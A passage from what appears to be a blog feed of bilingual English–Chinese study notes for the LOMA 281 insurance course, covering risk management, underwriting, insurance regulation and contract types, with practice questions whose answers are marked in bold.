treatment after having a mild stroke. During that period of hospitalization, Ms. Smith incurred $18,000 in covered medical expenses. Ms. Smith incurred no other medical expenses during the year. Therefore, Ms. Smith’s out-of-pocket medical expenses for last year totaled</p><ul><li>$1,000</li><li><strong>$3,000</strong> </li><li>$3,600</li><li>$4,400<blockquote><p>贝基·史密斯拥有一份个人医疗费用政策，规定每年1000美元的免赔额、20%的共同保险要求和3000美元的最高自付准备金。去年2月，史密斯女士因轻度中风住院四天接受治疗。在住院期间，史密斯女士承担了18000美元的医疗费用。史密斯女士在这一年中没有发生其他医疗费用。因此，史密斯女士去年的自付医疗费用总计</p><ul><li>1000美元</li><li>3000美元</li><li>3600美元</li><li>4400美元</li></ul></blockquote></li></ul><p>15.Monique Roberts would like to purchase a life insurance policy that will provide her with lifetime coverage. In addition, she wants a policy with a savings element. Select the answer choice that correctly identifies whether a cash value life insurance policy will provide Ms. Roberts with lifetime coverage and a savings element.<br>Lifetime coverage? &#x2F; A savings element?</p><ul><li><strong>yes yes</strong> </li><li>yes no</li><li>no yes</li><li>no no<blockquote><p>Monique Roberts想购买一份人寿保险，为她提供终身保险。此外，她希望制定一项包含储蓄成分的政策。选择正确识别现金价值人寿保险单是否会为罗伯茨女士提供终身保险和储蓄要素的答案。<br>终身保险？&#x2F;节约要素？</p><ul><li>是 是</li><li>是 不是</li><li>不是 是</li><li>不是 不是</li></ul></blockquote></li></ul><p>16.Thomas Corbin, who owns a long-term disability income insurance policy, recently suffered a disability that meets his policy’s definition of total disability. If Mr. Corbin’s policy is typical, he ( <strong>will</strong>  &#x2F; will not) have to satisfy an elimination period before disability income benefits begin. In addition, Mr. Corbin’s disability income benefits will be ( <strong>lower than</strong>  &#x2F; the same as) his pre-disability earnings.</p><blockquote><p>托马斯·科尔宾（Thomas Corbin）拥有一份长期残疾收入保险单，他最近患上了符合其保单对完全残疾定义的残疾。如果科尔宾先生的政策是典型的，他（将&#x2F;不会）必须在残疾收入福利开始之前满足一个消除期。此外，科尔宾先生的残疾收入福利将是（低于&#x2F;等于）他残疾前的收入。</p></blockquote><p>17.Maria and Lucas Milligan purchased a life insurance policy that covers both of their lives. This policy will pay the death benefit when either Maria or Lucas dies. After that, the coverage will end. In this situation, the Milligans have purchased the type of life insurance known as</p><ul><li>second-to-die life insurance</li><li><strong>joint whole life insurance</strong> </li><li>last survivor life insurance</li><li>family income coverage<blockquote><p>Maria和Lucas Milligan购买了一份涵盖他们两人生命的人寿保险。当玛丽亚或卢卡斯去世时，该保单将支付死亡抚恤金。之后，覆盖范围将结束。在这种情况下，米利根夫妇购买了被称为</p><ul><li>二次死亡人寿保险</li><li>共同终身保险</li><li>遗属人寿保险</li><li>家庭收入保险</li></ul></blockquote></li></ul><p>18.One type of annuity offers principal guarantees and a guaranteed minimum interest-crediting rate during the accumulation period. It also offers the potential for additional earnings, based on the performance of a reference index. In general, if the reference index gains in value over the year, the annuity earns interest credits. However, if the index shows no growth or loses value over the year, the annuity does not earn interest credits. This type of annuity is known as a</p><ul><li>fixed-rate deferred annuity (FRDA)</li><li>fixed immediate annuity</li><li>single-premium immediate annuity (SPIA)</li><li><strong>fixed indexed annuity(FIA)</strong> <blockquote><p>一种类型的年金提供本金担保，并在累积期内保证最低利息贷记率。它还提供了基于参考指数表现的额外收益潜力。一般来说，如果参考指数在一年中升值，年金就会获得利息抵免。然而，如果该指数在一年中没有增长或贬值，年金就不会获得利息抵免。这种类型的年金被称为</p><ul><li>固定利率递延年金</li><li>固定即时年金</li><li>一次性保费即时年金</li><li>固定指数年金</li></ul></blockquote></li></ul><p>19.The following statements are about annuity contracts. Select the answer choice containing the correct statement.</p><ul><li>The contract owner, annuitant, and payee must all be the same person.</li><li>An annuitant of an annuity contract can be a natural person or legal entity, such as a trust or corporation.</li><li><strong>In the United States, although banks, broker-dealers, and investment companies can sell annuities, only insurance companies can issue annuities.</strong> </li><li>For an annuity contract that names more than one annuitant, only the primary annuitant’s lifetime is used to determine the amount and duration of annuity payments.<blockquote><p>以下声明是关于年金合同的。选择包含正确陈述的答案。</p><ul><li>合同所有人、年金受益人和收款人必须是同一个人。</li><li>年金合同的年金受益人可以是自然人或法人，如信托或公司。</li><li>在美国，尽管银行、经纪公司和投资公司可以出售年金，但只有保险公司可以发行年金。</li><li>对于指定多个年金受益人的年金合同，只有主要年金受益人的寿命用于确定年金支付的金额和期限。</li></ul></blockquote></li></ul><p>20.Convertible term life insurance policies contain a conversion privilege that allows the policyowner to change the term life insurance policy to a cash value life insurance policy. With regard to the conversion of a term life insurance policy, it generally is correct to say that, after conversion, the</p><ul><li>face value of the policy has increased</li><li><strong>policyowner has lifetime coverage</strong> </li><li>policyowner still has term life insurance</li><li>insurer has no antiselection risk<blockquote><p>可转换定期人寿保险包含转换特权，允许投保人将定期人寿保险更改为现金价值人寿保险。关于定期人寿保险单的转换，通常可以正确地说，转换后</p><ul><li>保单的面值增加了</li><li>投保人享有终身保险</li><li>投保人仍有定期人寿保险</li><li>保险公司没有反选举风险</li></ul></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Loma </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Loma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Loma 281 Module1</title>
      <link href="/posts/51342/"/>
      <url>/posts/51342/</url>
      
        <content type="html"><![CDATA[<h1 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h1><h2 id="Types-of-Risk【风险种类】"><a href="#Types-of-Risk【风险种类】" class="headerlink" title="Types of Risk【风险种类】"></a><strong>Types of Risk【风险种类】</strong></h2><p><strong>Risk</strong> is the possibility of an unexpected result.</p><ul><li><p><strong>Speculative risk</strong> can result in a gain, a loss, or no change; </p></li><li><p><strong>pure risk</strong> involves either a loss or no loss.</p></li></ul><blockquote><p>投机风险可能获利。纯风险没有获利，只有纯风险才能投保。</p></blockquote><h2 id="Risk-Management【风险管理】"><a href="#Risk-Management【风险管理】" class="headerlink" title="Risk Management【风险管理】"></a><strong>Risk Management【风险管理】</strong></h2><p>Four risk management techniques:</p><ul><li><p>Avoid the risk：避免风险（比如当心亏钱而不投资股票）</p></li><li><p>Control the risk ：控制风险（比如安装烟雾探测器来防止或减少火灾的损失）</p></li><li><p>Accept the risk：接受风险（不通过其他方式管理风险：避免，控制或转移风险）</p></li><li><p>Transfer the risk：转移风险（比如通过购买保险将风险的经济责任转移给保险公司）</p></li></ul><h2 id="Life-Insurance-Terminology【人寿保险术语】"><a href="#Life-Insurance-Terminology【人寿保险术语】" class="headerlink" title="Life Insurance Terminology【人寿保险术语】"></a><strong>Life Insurance Terminology【人寿保险术语】</strong></h2><p>Two basic types of life insurance product:</p><ul><li><p><strong>Life insurance</strong>: The insurer promises to pay a death benefit when a named person dies. 寿险</p></li><li><p><strong>Annuity</strong>: In return for receiving a premium, an insurer promises to make periodic payments. 年金</p></li></ul><p>Parties involved in an insurance transaction:</p><ul><li><p><strong>Applicant</strong>: The person or entity that applies for an insurance policy. 申请人</p></li><li><p><strong>Policyowner</strong>: The person or entity that owns the issued policy. 保单所有者</p></li><li><p><strong>Insured:</strong> The person whose life or health the policy insures. 被保人</p></li><li><p><strong>Beneficiary</strong>: The person named to receive the policy benefit. 受益人</p></li><li><p><strong>Third-Party Policy</strong>: A policy purchased by one person or entity on the life of another person. 第三方保单</p></li></ul><h2 id="Insurable-Risks【可保风险】"><a href="#Insurable-Risks【可保风险】" class="headerlink" title="Insurable Risks【可保风险】"></a><strong>Insurable Risks【可保风险】</strong></h2><p>The characteristics of an insurable risk:</p><ul><li><p>The risk must be a pure risk：必须是纯风险，不能是投资风险</p></li><li><p>The loss must occur by chance：损失一定是偶然发送</p></li><li><p>The loss must be definite in time and amount：损失必须在时间和金额上明确</p></li><li><p>The loss must be significant：损失必须很大</p></li><li><p>The loss rate must be predictable：损失率必须是可预测的</p></li><li><p>The loss cannot be catastrophic to the insurer：损失对保险公司来说不会是灾难性的</p></li></ul><p>赔偿合同和定额合同：</p><p>contract of indemnity: An insurance policy under which the amount of the policy benefit payable for a covered loss is based on the actual amount of financial loss that results from the covered event, as determined at the time of the event.</p><ul><li>赔偿合同：一种保险单，根据该保险单，承保损失的应付保险金金额以承保事件造成的实际经济损失金额为基础，在事件发生时确定。</li></ul><p>valued contract: An insurance policy that specifies the amount of the policy benefit that will be payable when a covered loss occurs, regardless of the actual amount of the loss that was incurred.</p><ul><li>定额合同：一份保险单，规定了承保损失发生时应支付的保单福利金额，而不考虑实际发生的损失金额。</li></ul><p>face amount: The amount of the policy benefit that is payable if the insured dies while the policy is in force. Also known as face value. 跟定额合同相关</p><blockquote><p>人寿保险单是一种定额合同，保单签发时规定了被保险人死亡时应支付的赔偿金金额。其他类型的保险单是赔偿合同，以<strong>实际经济损失金额</strong>为基础给付，但须遵守保险单中规定的最高限额。</p></blockquote><p>Insurers minimize catastrophic losses by purchasing <strong>reinsurance—</strong>insurance for insurance companies.</p><p>Reinsurance allows the insurer—<strong>the direct writer</strong> or ceding company—to transfer (cede) risk above its retention limit to a <strong>reinsurer</strong> or assuming company. The reinsurer can accept all of the transferred risk, or it can cede some of the risk to a second reinsurer, known as a <strong>retrocessionaire</strong>.</p><blockquote><p>每个保险公司都设定了一个保留限额，即保险公司愿意承担的最大风险金额。</p><p>保险公司可以将超过保留限额的风险转移（分出）给再保险人或承担公司。</p></blockquote><h2 id="Underwriters-and-Underwriting【承保人及承保】"><a href="#Underwriters-and-Underwriting【承保人及承保】" class="headerlink" title="Underwriters and Underwriting【承保人及承保】"></a><strong>Underwriters and Underwriting【承保人及承保】</strong></h2><p><strong>Underwriters</strong> evaluate proposed risks and assign them to <strong>risk classes</strong>. </p><ul><li><p>Underwriters evaluate applications for physical hazards and moral hazards.</p></li><li><p>Underwriters try to avoid <strong>antiselection</strong>.</p></li></ul><p>medical risk factor: A physical or psychological characteristic that may increase the likelihood of loss.</p><p>医疗风险因素：可能增加损失可能性的身体或心理特征。</p><p>moral hazard: A characteristic that exists when the reputation, financial position, or criminal record of an applicant or a proposed insured indicates that the person may act dishonestly in the insurance transaction.</p><p>道德风险：当投保人或拟投保人的声誉、财务状况或犯罪记录表明此人可能在保险交易中做出不诚实行为时存在的一种特征。</p><p>antiselection: The tendency of individuals who believe they have a greater-than-average likelihood of loss to seek insurance protection to a greater extent than do other individuals.</p><p>反选择：认为自己遭受损失的可能性高于平均水平的个人比其他人更倾向于寻求保险保护。</p><h2 id="Risk-Classes【风险级别】"><a href="#Risk-Classes【风险级别】" class="headerlink" title="Risk Classes【风险级别】"></a><strong>Risk Classes【风险级别】</strong></h2><p>Individual life insurers usually identify at least four risk classes for proposed insureds.</p><ul><li><p><strong>Standard</strong>: Insurers classify proposed insureds whose likelihood of loss is not significantly greater than average as standard risks. The insurance company charges its <strong>standard premium rates</strong>.</p><ul><li>保险公司将损失可能性不显著高于平均水平的拟被保险人分类为<strong>标准风险</strong>。保险公司按标准费率收费。</li></ul></li><li><p><strong>Preferred</strong>: Insurers classify proposed insureds whose likelihood of loss is significantly lower than average as preferred risks. The insurance company charges these insureds <strong>preferred premium rates</strong>, which are lower than standard premium rates.</p><ul><li>保险公司将损失可能性显著低于平均水平的被保险人分类为<strong>优先风险</strong>。保险公司向这些被保险人收取比标准保险费率低的优先保险费率。</li></ul></li><li><p><strong>Substandard</strong>: Insurers classify proposed insureds whose likelihood of loss is significantly greater than average as substandard risks. The insurance company charges them <strong>substandard premium rates</strong>, which are higher than standard premium rates.</p><ul><li>保险公司将损失可能性明显大于平均水平的拟投保人分类为<strong>不合标准风险</strong>。保险公司向他们收取低于标准的保险费率，高于标准的保险费率。</li></ul></li><li><p><strong>Declined</strong>: Some proposed insureds present a risk that is too great for the insurer to cover. This might include people with a poor health history or those who engage in exceptionally risky activities, such as sky diving or mountain climbing.</p><ul><li><strong>拒绝风险</strong>，一些被保险人提出的风险太大，保险公司无法承担。这可能包括健康史不佳的人或从事特别危险活动的人，如跳伞或登山。</li></ul></li></ul><p>interest is present: Laws in most states require insurable interest to be present at policy issue to prevent people from buying insurance to wager on other people s lives.</p><p>大多数州的法律都规定，在购买保险时必须有可保险利益，这是为了防止人们以他人的生命为赌注购买保险。</p><blockquote><p>可保险利益：如果赫克托耳死亡，投保人赫克托耳和受益人玛丽亚将遭受真正的损失，因此可保险利益是存在的。</p></blockquote><h2 id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.Risk is the possibility of an unexpected result. Risks can be speculative risks or pure risks.(Speculative&#x2F;<strong>Pure</strong>) risk is an insurable risk because there is(a&#x2F;<strong>no</strong>) possibility of gain.</p><blockquote><p>风险是指意外结果的可能性。风险可以是投机风险，也可以是纯粹的风险。纯粹风险是一种可保险的风险，因为不存在收益的可能性。</p></blockquote><p>2.The following statements describe individuals who are using various risk management techniques. From the answer choices below, select the response that correctly describes an individual who is transferring risk.</p><ul><li>Lana installed a smoke detector in her new home to reduce the likelihood that it would be damaged or destroyed by a fire.</li><li>Josh does not own stock because he is afraid of losing money in the stock market.</li><li><strong>Carol, who recently retired, purchased an annuity to provide her with retirement income for the rest of her life.</strong></li><li>Amit, a small business owner, has set aside money to pay for his employees’ medical expenses.</li></ul><blockquote><p>以下陈述描述了使用各种风险管理技术的个人。从下面的回答选项中，选择正确描述转移风险的个人的回答。</p><ul><li><p>奥拉娜在她的新家里安装了一个烟雾探测器，以减少它被火灾损坏或摧毁的可能性。</p></li><li><p>Josh不持有股票，因为他害怕在股市上赔钱。</p></li><li><p>最近退休的OCarol购买了一份年金，为她提供余生的退休收入。</p></li><li><p>Amit是一家小企业主，他已经留出资金来支付员工的医疗费用。</p></li></ul></blockquote><p>3.Barry applied for and was issued an insurance policy covering the life of his wife, Ina. Barry named his daughter, Gail, as the individual who will receive the policy benefit should Ina die while the policy is in force. With regard to basic insurance terminology in this situation, it is most likely correct to say that </p><ul><li><strong>the policy Barry applied for is a third-party policy</strong> </li><li>Barry is the beneficiary of this policy </li><li>Gail is the insured for this policy </li><li>Ina is the policyowner of this policy</li></ul><blockquote><p>巴里申请并获得了一份涵盖其妻子伊娜生命的保险单。巴里指定他的女儿盖尔为在政策生效期间伊娜去世时将获得政策福利的人。关于这种情况下的基本保险术语，这样说很可能是正确的</p><ul><li><p>巴里申请的保单是第三方保单</p></li><li><p>巴里是这项政策的受益者</p></li><li><p>Gail是这份保单的被保险人</p></li><li><p>Ina是本保单的投保人</p></li></ul></blockquote><p>4.A risk, or potential loss, must have certain characteristics to be considered insurable. For example, to be insurable, a loss must </p><ul><li>not occur by chance </li><li>be catastrophic to the insurer </li><li><strong>be significant</strong></li><li>have a rate of loss that is unpredictable</li></ul><blockquote><p>风险或潜在损失必须具有某些特征才能被视为可保险。例如，要想投保，损失必须</p><ul><li><p>不是偶然发生的</p></li><li><p>对保险公司来说是灾难性的</p></li><li><p>意义重大</p></li><li><p>损失率是不可预测的</p></li></ul></blockquote><p>5.Carly Pavin, an underwriter for the Keen Insurance Company, has gathered the following information about Van Gregg, a proposed insured:</p><ul><li>Fact A: Mr. Gregg is overweight and has high blood pressure【<strong>medical risk factor</strong>】</li><li>Fact B: Mr. Gregg was convicted of tax evasion five years ago 【<strong>moral hazard</strong>】</li></ul><p>From the answer choices below, select the response that correctly indicates whether Ms. Pavin would correctly classify Facts A and B as moral hazards or medical risk factors.</p><blockquote><p>Keen保险公司的保险人Carly Pavin收集了关于Van Gregg的以下信息，Van Gregg是一名拟议的被保险人：</p><ul><li><p>事实A：格雷格先生超重并且患有高血压</p></li><li><p>事实B：Gregg先生五年前被判逃税罪。</p></li></ul><p>从下面的答案中，选择正确表明Pavin女士是否会将事实A和B正确归类为道德风险或医疗风险因素的答案。</p></blockquote><p>6.In assessing the degree of risk represented by a proposed insured, an underwriter must consider the tendency of individuals who have a greater-than-average likelihood of loss to seek insurance protection to a greater extent than do other individuals. This tendency is known, by definition, as</p><ul><li>reinsurance </li><li>the law of large numbers </li><li><strong>antiselection</strong> </li><li>riskpooling</li></ul><blockquote><p>在评估拟议被保险人所代表的风险程度时，保险人必须考虑损失可能性高于平均水平的个人比其他个人更大程度地寻求保险保护的趋势。根据定义，这种趋势被称为</p><ul><li><p>再保险</p></li><li><p>大数定律</p></li><li><p>反选举</p></li><li><p>风险分担</p></li></ul></blockquote><p>7.The Nimble Life Insurance Company places proposed insureds into one of four risk classes: preferred, standard, substandard, and declined. An underwriter for Nimble determined that Hai Zhang,a proposed insured, presented a likelihood of loss that was not significantly greater than average. This information indicates that Nimble placed Mr. Zhang in the risk class known as the </p><ul><li>preferred risk class </li><li><strong>standard risk class</strong> </li><li>substandard risk class </li><li>declined risk class</li></ul><blockquote><p>灵活人寿保险公司将拟议的被保险人分为四个风险类别之一：首选、标准、不合格和拒绝。Nimble的一位保险人认定，被保险人张海（Hai Zhang）的损失可能性并不明显高于平均水平。这些信息表明，Nimble将张列入了被称为</p><ul><li><p>首选风险类别</p></li><li><p>标准风险等级</p></li><li><p>不合格风险等级</p></li><li><p>拒绝风险等级</p></li></ul></blockquote><h1 id="Lesson-2"><a href="#Lesson-2" class="headerlink" title="Lesson 2"></a>Lesson 2</h1><h2 id="Financial-Institutions-and-the-Insurance-Industry【金融机构和保险业】"><a href="#Financial-Institutions-and-the-Insurance-Industry【金融机构和保险业】" class="headerlink" title="Financial Institutions and the Insurance Industry【金融机构和保险业】"></a><strong>Financial Institutions and the Insurance Industry【金融机构和保险业】</strong></h2><p>Types of Financial Institutions: </p><ul><li><p><strong>Depository institutions</strong> accept deposits and make loans.  </p></li><li><p><strong>Finance companies</strong> make short- and medium-term loans. </p></li><li><p><strong>Securities firms</strong> buy and sell stocks, bonds, and other investments on behalf of investors. <strong>Mutual fund companies</strong> maintain a diversified portfolio by using investor’s funds to buy and sell a variety of securities.</p></li><li><p><strong>Insurance companies</strong> issue products that cover personal risk, property damage risk, and liability risk.</p></li></ul><blockquote><ul><li><p>存款机构接受存款并发放贷款。</p></li><li><p>金融公司提供短期和中期贷款。</p></li><li><p>证券公司代表投资者买卖股票、债券和其他投资。共同基金公司通过利用投资者的资金买卖各种证券来维持多元化的投资组合。</p></li><li><p>保险公司发行的产品涵盖个人风险、财产损失风险和责任风险。</p></li></ul></blockquote><hr><p>Deregulation and other factors have contributed to the removal of barriers that historically prevented different financial institutions from competing with each other. This evolution of the insurance industry is characterized by</p><ul><li><p>Convergence 融合，向能够满足客户银行、保险和证券需求的单一金融机构的转变。</p></li><li><p>Consolidation 合并，主要通过兼并(<strong>merger</strong>)和收购(<strong>acquisition</strong>)进行，导致传统金融服务机构减少。</p></li><li><p>Globalization 全球化，商业、技术或哲学向全世界传播的趋势</p></li></ul><hr><p>People and businesses purchase insurance products to cover three types of risk:</p><ul><li><strong>Personal risk:</strong> Risks arising from the possibility of death, illness, injury, inability to work, or outliving one’s savings</li><li><strong>Property damage risk:</strong> Risks occurring from damage to, destruction of, or the disappearance of real property such as a home, an automobile, or personal belongings</li><li><strong>Liability risk:</strong> Risks occurring from acts or omissions that result in harm to others or their property</li></ul><hr><p>Life and health insurers protect against financial losses from death, disability, illness, accident, and outliving one’s savings. </p><p><strong>Life and Health Products:</strong></p><ul><li>Life insurance</li><li>Medical expense insurance</li><li>Disability insurance</li><li>Annuities</li></ul><p>Property&#x2F;casualty insurers insure against losses to your property and from your unintentionally harming others. </p><p><strong>Property&#x2F;Casualty Products:</strong></p><ul><li>Automobile insurance</li><li>Homeowners insurance</li><li>Liability insurance</li></ul><h2 id="Insurance-Company-Organization【保险公司组织】"><a href="#Insurance-Company-Organization【保险公司组织】" class="headerlink" title="Insurance Company Organization【保险公司组织】"></a><strong>Insurance Company Organization【保险公司组织】</strong></h2><p>Typically, insurance companies are organized as stock insurance companies, mutual insurance companies, or fraternal benefit societies.</p><ul><li>stock insurer 股票保险公司<ul><li>Can issue shares of stock 发行股票</li><li>Owned by stockholders, who have voting rights in the company 由在公司拥有投票权的股东所有</li><li>Stockholders may receive shares of operating profits known as <strong>stock dividends</strong> 股东可以获得股票分红</li></ul></li><li>mutual insurer 共同保险公司<ul><li>Owned by policyowners 保单持有人所有</li><li>Policyowners have membership rights (voting rights in the company) 保单持有人拥有会员权（公司投票权）</li><li>Policyowners may periodically receive an amount of money known as a <strong>policy dividend</strong> 保单持有人可能会定期收到保单红利</li></ul></li><li>fraternal benefit societies 兄弟福利协会<ul><li>Owned by members of a fraternal lodge system 由兄弟会的成员拥有的</li><li>Provides social and insurance benefits only to fraternal members and their families 只向兄弟成员及其家庭提供社会和保险福利</li><li>Legally required to have a representative form of government 法律上要求有一个代议制的政府</li></ul></li></ul><h2 id="Insurance-Regulation【保险监管】"><a href="#Insurance-Regulation【保险监管】" class="headerlink" title="Insurance Regulation【保险监管】"></a><strong>Insurance Regulation【保险监管】</strong></h2><p>Two Goals of Insurance Regulation</p><ul><li><p><strong>Solvency Regulation</strong> 偿付能力监管</p><ul><li>Solvency regulation is known as <em>prudential regulation</em> in many countries. </li><li>偿付能力监管在许多国家被称为审慎监管。</li></ul></li><li><p><strong>Market Conduct Regulation</strong> 市场行为监管</p></li></ul><p>Federal laws pertaining to insurance industry: <strong>McCarran-Ferguson Act</strong> and <strong>Dodd-Frank Act</strong>, which established the <strong>Federal Insurance Office (FIO)</strong>.</p><p>与保险业有关的联邦法律：麦卡兰-弗格森法案和多德-弗兰克法案，后者建立了联邦保险办公室（FIO）</p><hr><ul><li><p>州政府：In the United States, insurance is regulated mainly by state insurance departments. <strong>States</strong> oversee insurers’  </p><ul><li><p>Market conduct practices  市场行为实践</p></li><li><p>Financial condition 财务状况</p></li><li><p>Policy forms 保单表格</p></li></ul></li><li><p>联邦政府：The <strong>federal government</strong> regulates</p><ul><li><p>Sales of variable life insurance and annuities 可变人寿保险和年金的销售</p><ul><li>Variable life insurance and variable annuities are considered to be <strong>investment products</strong> and so are regulated by the U.S. Securities and Exchange Commission(<strong>SEC</strong>). The owner, not the insurer, assumes most, if not all, of the investment risk for a variable product. Individuals selling variable insurance products must obtain both a state insurance license and a Financial Industry Regulatory Authority(<strong>FINRA</strong>) license to sell investment securities.</li><li>可变人寿保险和可变年金被视为投资产品，因此受到美国证券交易委员会的监管。可变产品的大部分（如果不是全部的话）投资风险由所有者而非保险公司承担。销售可变保险产品的个人必须同时获得州保险许可证和美国金融业监管局许可证才能销售投资证券。</li></ul></li><li><p>Consumer protections 消费者保护</p></li><li><p>Consumer privacy 消费者隐私</p></li><li><p>Income taxes 所得税</p></li><li><p>Antiterrorism 反恐怖主义</p></li></ul></li><li><p>联邦保险办公室：<strong>FIO</strong> with authority to monitor the insurance industry, identify areas with inadequate state regulation, and handle international insurance issues.</p><ul><li>FIO有权监督保险业，确定国家监管不足的领域，并处理国际保险问题。</li></ul></li><li><p>全国保险专员协会：National Association of Insurance Commissioners (<strong>NAIC</strong>) helps standardize regulations among the states. </p><ul><li>NAIC帮助各州规范法规。</li></ul></li></ul><h2 id="课后习题-1"><a href="#课后习题-1" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.The Purslane Company is a type of financial institution that specializes in the purchase and sale of certificates, such as shares of stock, which represent an ownership interest, or bonds, which represent a debt owed. This information indicates that Purslane is the type of financial institution known as</p><ul><li>a depository institution </li><li><strong>a securities firm</strong> </li><li>an insurance company</li><li>a finance company</li></ul><blockquote><p>Purslane公司是一种专门从事证书买卖的金融机构，如代表所有权权益的股票或代表所欠债务的债券。这些信息表明，Purslane是一种被称为</p><ul><li>储蓄机构</li><li>证券公司</li><li>保险公司</li><li>金融公司</li></ul></blockquote><p>2.The Steady Insurance Company operates in a competitive climate in which a single financial services institution often sells a wide range of banking, insurance, and investment products and services. Such a competitive climate is best described by the term known as</p><ul><li>acquisition</li><li>consolidation </li><li>globalization</li><li><strong>convergence</strong></li></ul><blockquote><p>Steady Insurance Company在竞争激烈的环境中运营，一家金融服务机构通常销售广泛的银行、保险和投资产品和服务。这种竞争性的气候最好用以下术语来描述：</p><ul><li>收购</li><li>合并</li><li>全球化</li><li>融合</li></ul></blockquote><p>3.All insurance companies are corporations. Characteristics of corporations include that they (<strong>are</strong>&#x2F;are not) distinct from their owners and that they(<strong>do</strong>&#x2F;do not) extend beyond the deaths of their owners.</p><blockquote><p>公司是由政府单位的权力创建的法人实体，与拥有该公司的人分开且不同。公司提供了稳定性和持久性的要素，使其成为保险公司的理想结构，保险公司的合同义务可以延续多年。</p></blockquote><p>4.The Yarrow Insurance Company is organized as a stock insurer. Therefore, one characteristic of Yarrow is that </p><ul><li>it operates through a lodge system </li><li>it is owned by its policyowners </li><li><strong>its stockholders have voting rights in Yarrow</strong> </li><li>its policyowners may receive shares of its operating profits in the form of stock dividends</li></ul><blockquote><p>雅罗保险公司是一家股票保险公司。因此，雅罗的一个特点是</p><ul><li><p>它通过帮会运作</p></li><li><p>它由保单持有人所有</p></li><li><p>其股东在雅罗拥有投票权</p></li><li><p>其保单持有人可以以股票股息的形式获得其经营利润的份额</p></li></ul></blockquote><p>5.One primary focus of insurance regulation is to ensure that insurance companies conduct their businesses fairly. This type of insurance regulation is known, by definition, as </p><ul><li><p><strong>market conduct regulation</strong> </p></li><li><p>solvency regulation </p></li><li><p>prudential regulation </p></li><li><p>securities regulation</p></li></ul><blockquote><p>保险监管的一个主要重点是确保保险公司公平地开展业务。根据定义，这种类型的保险监管被称为</p><ul><li><p>市场行为监管</p></li><li><p>偿付能力监管</p></li><li><p>审慎监管</p></li><li><p>证券监管</p></li></ul></blockquote><p>6.The following statements are about the regulation of insurance companies in the United States. Select the answer choice containing the correct statement.</p><ul><li>Insurance companies in the United States are primarily regulated by the federal government.</li><li>The U.S. McCarran-Ferguson Act created the Federal Insurance OfCE(FlO) with authority to monitor the insurance industry.</li><li>If an insurance company operating within a state is unable to pay its policy benefits, the National Association of Insurance Commissioners (NAIC) provides funds to cover a specified portion of the company’s benefit payments.</li><li><strong>To ensure compliance with solvency legislation, state regulators conduct formal investigations of an insurer’s financial condition at least every three to five years.</strong></li></ul><blockquote><p>以下声明是关于美国保险公司的监管。选择包含正确陈述的答案。</p><ul><li><p>美国的保险公司主要由联邦政府监管。</p></li><li><p>美国《麦卡伦-弗格森法案》设立了联邦保险管理局，有权监督保险业。</p></li><li><p>如果在一个州内经营的保险公司无法支付其保单福利，全国保险专员协会（NAIC）将提供资金来支付公司福利金的特定部分。</p></li><li><p>为了确保遵守偿付能力立法，州监管机构至少每三到五年对保险公司的财务状况进行一次正式调查</p></li></ul></blockquote><h1 id="Lesson-3"><a href="#Lesson-3" class="headerlink" title="Lesson 3"></a>Lesson 3</h1><h2 id="Insurance-Contracts【保险合约】"><a href="#Insurance-Contracts【保险合约】" class="headerlink" title="Insurance Contracts【保险合约】"></a><strong>Insurance Contracts【保险合约】</strong></h2><p>An insurance policy is a legally enforceable <strong>contract</strong> between a <strong>policyowner</strong> who applies for and owns the policy and the <strong>insurer</strong> that issues the policy.</p><p>保险单是申请并拥有该保险单的投保人与签发该保险单的保险人之间的一种具有法律强制执行效力的合同。</p><h2 id="Types-of-Contracts【合同类型】"><a href="#Types-of-Contracts【合同类型】" class="headerlink" title="Types of Contracts【合同类型】"></a><strong>Types of Contracts【合同类型】</strong></h2><p>Contracts can be divided into types depending on their characteristics.</p><ul><li><p>Bilateral contract: Both parties make legally enforceable promises.</p><ul><li>双边合同：双方作出具有法律效力的承诺。</li></ul></li><li><p>Unilateral contract: Only one party’s promise is legally enforceable.</p><ul><li>单方面合同：只有一方的承诺具有法律效力。</li></ul></li><li><p>Commutative contract: The parties to the contract exchange items or services that are relatively equal in value.</p><ul><li>交换合同：合同双方交换价值相对相等的物品或服务。</li></ul></li><li><p>Aleatory contract: One party provides something of value to another in exchange for a conditional promise.</p><ul><li>选择性合同：一方向另一方提供有价值的东西以换取有条件的承诺。</li></ul></li><li><p>Bargaining contract: Both parties, as equals, set the terms and conditions of the contract.</p><ul><li>议价合同：双方平等地制定合同的条款和条件。</li></ul></li><li><p>Contract of adhesion: One party prepares the contract for the other party to accept or reject as a whole, without any bargaining.</p><ul><li>附意合同：一方准备合同，供另一方作为一个整体接受或拒绝，无需任何讨价还价。</li></ul></li><li><p>Informal contract: Enforceable because the parties to the contract met the requirements concerning the substance of the agreement.</p><ul><li>非正式合同：可强制执行，因为合同各方符合协议实质的要求。</li></ul></li><li><p>Formal contract: Enforceable because the parties to the contract met requirements concerning the form of the contract itself.</p><ul><li>正式合同：可强制执行，因为合同各方符合合同形式本身的要求。</li><li>一份正式的合同要求双方履行一定的手续，比如聘请法律顾问创建合同，或者由公证人验证合同。房地产买卖合同是一种正式合同。</li></ul></li></ul><blockquote><p>the characteristics of an insurance contract:</p><ul><li>Aleatory contract</li><li>Contract of adhesion</li><li>Informal contract</li><li><strong>Unilateral contract</strong></li></ul></blockquote><hr><ul><li><p>Valid Contract: A contract that satisfies all the legal requirements and is enforceable by law.</p><ul><li>有效合同：满足所有法律要求并可依法执行的合同。</li></ul></li><li><p>Void Contract: A contract that does not meet one or more of the legal requirements to create a legally enforceable contract.</p><ul><li>无效合同：不符合一项或多项法律要求的合同，不能成为具有法律效力的合同。</li></ul></li><li><p>Voidable Contract: A contract in which a party has the right to reject her obligations under the contract.</p><ul><li>可撤销合同：一方有权拒绝履行其在合同项下的义务的合同。</li></ul></li></ul><h2 id="A-Valid-Contract【一张有效合同】"><a href="#A-Valid-Contract【一张有效合同】" class="headerlink" title="A Valid Contract【一张有效合同】"></a><strong>A Valid Contract【一张有效合同】</strong></h2><p>Remember that the requirements for a valid contract are</p><ul><li>Mutual assent: The parties reach a meeting of the minds about the terms of a contract when 相互同意<ul><li>One party makes an offer and the other party accepts that offer</li><li>All parties express intent to be bound by the terms of the 